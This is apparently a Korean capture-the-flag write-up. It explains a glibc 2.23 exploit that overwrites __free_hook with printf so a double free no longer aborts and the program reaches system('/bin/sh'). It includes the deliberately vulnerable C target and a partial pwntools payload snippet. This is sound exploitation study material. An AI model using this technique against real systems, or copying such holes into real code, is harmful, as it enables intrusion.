# hook (`__free_hook` + double free 우회)

임의 주소 쓰기로 `__free_hook`을 무해한 함수로 덮어, 뒤따르는 **double free의 abort를 회피**하고 마지막의 `system("/bin/sh")`까지 도달한다.

## 대상 코드

```c
int main() {
    long *ptr; size_t size;
    printf("stdout: %p\n", stdout);   // libc 릭 제공
    scanf("%ld", &size);
    ptr = malloc(size);
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);         // ptr[0]이 가리키는 주소에 ptr[1] 기록 = AAW
    free(ptr);
    free(ptr);                        // double free
    system("/bin/sh");                // 여기까지 오면 셸
}
```

- libc: 2.23.
- `stdout` 주소를 직접 알려주므로 libc base 계산이 쉽다.
- `*(long*)*ptr = *(ptr+1)` 은 사용자가 넣은 `ptr[0]`(주소), `ptr[1]`(값)으로 **임의 주소 쓰기**를 수행한다.

## 왜 free hook을 덮는가

프로그램은 마지막에 `system("/bin/sh")`를 **무조건** 실행한다. 문제는 그 직전의 `free(ptr); free(ptr);` 이다. glibc 2.23에서 같은 청크를 연속 free하면 `double free or corruption (fasttop)` 검사에 걸려 **abort**되고, `system`에 도달하지 못한다.

해결: `__free_hook`을 정상 free가 아닌 **아무 무해한 함수(여기선 `printf`)** 로 덮는다. 그러면 `free()`가 내부 검증 로직을 타지 않고 곧장 훅(`printf(ptr)`)만 호출하므로, double free 검사 자체가 실행되지 않는다. 두 번의 free가 조용히 지나가고 `system("/bin/sh")`가 실행된다.

## 익스플로잇 원리

```python
p.recvuntil(b"stdout: ")
libc_base = int(...) - libc.symbols["_IO_2_1_stdout_"]
printf = libc_base + libc.symbols["printf"]
hook   = libc_base + libc.symbols["__free_hook"]

# ptr[0] = hook, ptr[1] = printf  →  *(long*)hook = printf
payload = p64(hook) + p64(printf)
```

- AAW `*(long*)*ptr = *(ptr+1)` 가 `*hook = printf`가 되도록 배치.
- 이후 `free(ptr)`가 `printf(ptr)`로 바뀌어 abort 없이 통과 → `system("/bin/sh")`.

## 핵심 개념

- **훅으로 검증 우회**: `__free_hook`이 설정되면 free의 정상 경로(청크 검사·병합)가 실행되지 않는다. 이 성질을 double free 방어 우회에 이용.
- 임의 실행이 아니라 **크래시 회피 용도**로 훅을 쓴 사례라는 점이 fho와의 차이.
